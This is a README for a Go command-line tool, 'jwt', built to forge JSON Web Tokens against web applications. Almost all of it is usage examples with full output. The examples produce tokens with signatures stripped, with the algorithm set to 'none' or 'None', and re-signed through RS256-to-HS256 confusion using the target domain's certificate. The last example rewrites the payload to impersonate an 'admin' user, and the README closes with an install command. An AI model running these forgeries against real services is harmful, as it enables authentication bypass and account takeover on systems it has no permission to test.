# jwt

`jwt` is a tool that will help maniupulate JWT tokens to perform different JWT attacks. 

# Usage example

```
▶ jwt -t "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY"


Analyzing                              eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY

Header                                 {"typ":"JWT","alg":"RS256"}

Current Payload                        {"id": "25","username": "user", "age": "27"}

New Payload                            {"age":"27","id":"25","username":"user"}

JWT without signature:                 eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ==.

JWT without signature: RM Padding      eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ.

JWT w/ sign, ALG:none:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ==.

JWT w/ sign, ALG:none:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ.

JWT w/ sign, ALG:None:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ==.

JWT w/ sign, ALG:None:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ.
```

If Algorithm is "RS256", it is recommended to try replacing with HS256 and generate a new signature with the SSL certificate from the current domain:

```
▶ jwt -d example.com  -t "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY"

Analyzing                              eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY

Header                                 {"typ":"JWT","alg":"RS256"}

Current Payload                        {"id": "25","username": "user", "age": "27"}

New Payload                            {"age":"27","id":"25","username":"user"}

JWT without signature:                 eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ==.

JWT without signature: RM Padding      eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ.

JWT w/ sign, ALG:none:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ==.

JWT w/ sign, ALG:none:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ.

JWT w/ sign, ALG:None:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ==.

JWT w/ sign, ALG:None:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ.

JWT RS256 to HS256:                    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ==.366533363237303963383735643934656633373836386664376231623134646234313264636661393137343730356565366661366661336161366132353764370a

JWT RS256 to HS256, RM Padding:        eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ.366533363237303963383735643934656633373836386664376231623134646234313264636661393137343730356565366661366661336161366132353764370a

JWT RS256 to HS256 (B64):              eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ==.MzY2NTMzMzYzMjM3MzAzOTYzMzgzNzM1NjQzOTM0NjU2NjMzMzczODM2Mzg2NjY0Mzc2MjMxNjIzMTM0NjQ2MjM0MzEzMjY0NjM2NjYxMzkzMTM3MzQzNzMwMzU2NTY1MzY2NjYxMzY2NjYxMzM2MTYxMzY2MTMyMzUzNzY0MzcwYQ==

JWT RS256 to HS256 (B64), RM Padding:  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMjUiLCJ1c2VybmFtZSI6InVzZXIifQ.MzY2NTMzMzYzMjM3MzAzOTYzMzgzNzM1NjQzOTM0NjU2NjMzMzczODM2Mzg2NjY0Mzc2MjMxNjIzMTM0NjQ2MjM0MzEzMjY0NjM2NjYxMzkzMTM3MzQzNzMwMzU2NTY1MzY2NjYxMzY2NjYxMzM2MTYxMzY2MTMyMzUzNzY0MzcwYQ==
```

Once you have validated that one of the above techniques work, try to update the payload:

```
▶ jwt -j '{"id":"1","username":"admin"}' -d example.com  -t "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY"

Analyzing                              eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ICIyNSIsInVzZXJuYW1lIjogInVzZXIiLCAiYWdlIjogIjI3In0=.yeL_0mTXF7uVDxUGeFVzlBNDEEas9-Y4ZuFV40Y4UNY

Header                                 {"typ":"JWT","alg":"RS256"}

Current Payload                        {"id": "25","username": "user", "age": "27"}

New Payload                            {"age":"27","id":"1","username":"admin"}

JWT without signature:                 eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ==.

JWT without signature: RM Padding      eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.

JWT w/ sign, ALG:none:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ==.

JWT w/ sign, ALG:none:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.

JWT w/ sign, ALG:None:                   eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ==.

JWT w/ sign, ALG:None:, RM Padding       eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.

JWT RS256 to HS256:                    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ==.643538383163666634623232643562393038323166366137643434353934666332653038633838656663353134623539373134646135303838363532643130340a

JWT RS256 to HS256, RM Padding:        eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.643538383163666634623232643562393038323166366137643434353934666332653038633838656663353134623539373134646135303838363532643130340a

JWT RS256 to HS256 (B64):              eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ==.NjQzNTM4MzgzMTYzNjY2NjM0NjIzMjMyNjQzNTYyMzkzMDM4MzIzMTY2MzY2MTM3NjQzNDM0MzUzOTM0NjY2MzMyNjUzMDM4NjMzODM4NjU2NjYzMzUzMTM0NjIzNTM5MzczMTM0NjQ2MTM1MzAzODM4MzYzNTMyNjQzMTMwMzQwYQ==

JWT RS256 to HS256 (B64), RM Padding:  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZ2UiOiIyNyIsImlkIjoiMSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.NjQzNTM4MzgzMTYzNjY2NjM0NjIzMjMyNjQzNTYyMzkzMDM4MzIzMTY2MzY2MTM3NjQzNDM0MzUzOTM0NjY2MzMyNjUzMDM4NjMzODM4NjU2NjYzMzUzMTM0NjIzNTM5MzczMTM0NjQ2MTM1MzAzODM4MzYzNTMyNjQzMTMwMzQwYQ==
```

# Install

```
▶ go get -u github.com/NkxxkN/jwt
```